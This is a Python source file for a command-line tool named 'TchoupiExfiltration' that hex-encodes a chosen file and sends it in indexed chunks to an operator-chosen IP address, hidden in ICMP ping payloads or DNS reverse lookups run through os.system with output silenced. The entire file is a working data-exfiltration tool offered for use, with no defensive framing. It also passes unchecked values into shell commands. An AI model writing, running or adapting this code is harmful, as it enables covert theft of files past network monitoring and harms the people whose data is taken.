import argparse
import os
import base64
import binascii
from threading import Thread



# The following lines are the script arguments initialization.

parser = argparse.ArgumentParser(
    prog="TchoupiExfiltration",
    description="A simple script to perform DNS and ICMP exfiltration",
    epilog="authored by Tchoupi"
)

parser.add_argument('file', type=str, help="The file to extract")
parser.add_argument('-m', '--method', type=str, required=True, choices=["icmp", "dns"], dest="method", help="Select the extraction method")
parser.add_argument('-i', '--ip', type=str, required=True, help="The exfiltration target", dest="ip")
parser.add_argument('-f', '--format', choices=['txt', 'img'], default="txt", type=str, help="The format of the file (default: txt)", dest="format")
parser.add_argument('-T', '--threads', choices=range(1, 5), default=1, type=int, help="Number of threads to use during exfiltration", dest="threads")
parser.add_argument('--no-hex', action="store_false", help="Prevent hexadecimal conversion during exfiltration", dest="hex")



# File parser

def parse_txt_file(file):
    """Return a text file content.

    Args:
        file (file): The file to fetch the content to.

    Returns:
        str: The file content.
    """
    return str(file.read())

def parse_image_file(file):
    """Return the string content of an image file.

    Args:
        file (file): The file to fetch the content to.

    Returns:
        str: The str base64 of the image file.
    """
    return str(base64.b64encode(file.read()))

# For code lisability (and to remove conditions), we place the parsers inside a variable
file_parser = {
    "txt": parse_txt_file,
    "img": parse_image_file
}


# Exfiltration functions

def icmp_exfiltration(ip, hex_chrunk):
    """Run a ping, and pass the hex_chrunk as the payload.
    (Execution is silenced by the ">/dev/null 2>&1")

    Args:
        ip (str): The ip to target.
        hex_chrunk (str): The data to exfiltrate.
    """
    os.system("ping {} -c 3 -p {} >/dev/null 2>&1".format(ip, hex_chrunk))

def dns_exfiltration(ip, hex_chrunks):
    """Run a dig command, and pass the hex_chrunks as the list of names to test.

    Args:
        ip (str): The "DNS" ip to target.
        hex_chrunks (List[str]): The list of hexadecimal chrunks.
    """
    os.system("dig @{} -x {} >/dev/null 2>&1".format(ip, " ".join(hex_chrunks)))

# Here again for lisability, we place the exfiltration methods into one variable
exfiltration_methods = {
    "dns": dns_exfiltration,
    "icmp": icmp_exfiltration
}



# Hexadecimal managers

def hexadecimal_conversion(string):
    """Returns the hexadecimal version of a string.

    Args:
        string (str): The string to parse.

    Returns:
        str: The hexadecimal string
    """
    return binascii.hexlify(string)


def hexadecimal_dividor(hexastring):
    """Divides a hexadecimal string into a list of hexadecimal chrunks.

    Args:
        hexastring (str): The hexadecimal string

    Returns:
        List[str]: The list of hexadecimal chrunks.
    """
    content = []
    index = 0
    
    # For each chrunk we will add the <index>; separator.
    # It will tell the recovery script where the chrunk is supposed to go

    for i in range(0, len(hexastring) - 1, 20):
        content.append(binascii.hexlify(str(index)+";") + hexastring[i:i+20])
        index = index + 1
    return content


def main():
    # We first parse the arguments to initialize the needed variables
    args = parser.parse_args()

    # Output a summary of the script execution's settings
    print(
"""
TCHOUPI EXFILTRATION
Extraction details :
    File        : {} (format : {})
    Method      : {}
    Target      : {}
    Nb Threads  : {}
    Hexadecimal : {}
""".format(
        args.file, args.format,
        args.method,
        args.ip,
        args.threads,
        args.hex
    ))

    # Open the file
    file = open(args.file, 'r')

    # Convert the file content into chrunks of hexadecimal values
    file_string = file_parser[args.format](file)                        # Fetch the file content as a string
    hexadecimal_string = hexadecimal_conversion(file_string)            # Convert the string into hexadecimal
    hexadecimal_chrunks = hexadecimal_dividor(hexadecimal_string)       # Slice the hexadecimal into chrunks

    # Retrieve the exfiltration method to use
    exfiltration = exfiltration_methods[args.method]                    
    print(">>> Performing exfiltration through {}".format(args.format))




    # Perform the exfiltration
    steps = []
    if args.method == "dns":    # DNS method

        # We slice the chrunks into steps (for the threads)
        for i in range(0, len(hexadecimal_chrunks), 5):
            steps.append(hexadecimal_chrunks[i:i+5])

        # For each steps, we are going to perform the exfiltration
        for index, hex_chrunks in enumerate(steps):
            threads = []
            print(">>> Progress...... : {}/{}".format(index, len(steps)))
            
            # Generate the threads
            threads.append(Thread(target=exfiltration, args=[args.ip, hex_chrunks]))

            # Start the threads
            for thread in threads:
                thread.start()

            # Wait for the threads to finish before launching further threads
            for thread in threads:
                thread.join()


    elif args.method == "icmp":     # ICMP method
        # We slice the chrunks into steps (for the threads)
        for i in range(0, len(hexadecimal_chrunks), args.threads):
            steps.append(hexadecimal_chrunks[i:i+args.threads])
        
        # For each steps, we are going to perform the exfiltration
        for index, step in enumerate(steps):
            threads = []
            print(">>> Progress...... : {}/{}".format(index, len(steps)))
            
            # Create the threads for each chrunk in the step
            for chrunk in step:
                threads.append(Thread(target=exfiltration, args=[args.ip, chrunk]))

            # Start the thread
            for thread in threads:
                thread.start()
            
            # Wait for the thread to finish
            for thread in threads:
                thread.join()


    else:
        print(">>> ERROR : method {} not supported")


    print(">>> END OF EXFILTRATION")


if __name__ == "__main__":
    main()